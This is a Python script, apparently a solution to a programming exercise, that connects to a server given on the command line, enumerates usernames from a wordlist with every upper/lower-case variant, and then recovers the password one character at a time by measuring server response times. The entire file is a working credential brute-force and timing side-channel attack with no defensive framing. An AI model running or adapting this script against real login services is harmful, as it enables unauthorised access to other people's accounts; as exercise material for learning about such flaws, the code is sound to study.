from datetime import datetime
from string import ascii_letters, digits
import itertools
import json
import os
import socket
import sys

 
 
class Hack:
    def __init__(self):
        assert len(sys.argv) == 3, 'Command Line should only have 2 arguments'
        self.ip = sys.argv[1]
        self.port = int(sys.argv[2])
 
    @staticmethod
    def generate_logins():
        with open(os.path.realpath('logins.txt'), 'r') as f:
            for line in f:
                yield line.rstrip('\n')
 
    @staticmethod
    def attempt_logins(logins, client_socket):
        for login in logins:
            for case in map(''.join, itertools.product(*zip(login.upper(), login.lower()))):
                json_request = json.dumps({'login': case, 'password': ' '})
                client_socket.send(json_request.encode(encoding='utf-8'))
                response = json.loads(client_socket.recv(2048).decode(encoding='utf-8'))
                if response["result"] == 'Wrong password!':
                    return case
 
    @staticmethod
    def attempt_passwords(correct_login, client_socket):
        correct_password = ''
        while True:
            for char in ascii_letters + digits:
                correct_password += char
                client_socket.send(json.dumps({"login": correct_login, "password": correct_password}).encode())
                start = datetime.now()
                response = json.loads(client_socket.recv(2048).decode())
                finish = datetime.now()
                if response["result"] == "Wrong password!":
                    if (finish - start).microseconds <= 100000:
                        correct_password = correct_password[:-1]
                    else:
                        break
                elif response["result"] == "Connection success!":
                    return json.dumps({"login": correct_login, "password": correct_password})
 
    def main(self):
        with socket.socket() as client_socket:
            client_socket.connect((self.ip, self.port))
            print(self.attempt_passwords(self.attempt_logins(self.generate_logins(), client_socket), client_socket))
 
 
if __name__ == '__main__':
    hack = Hack()
    hack.main()
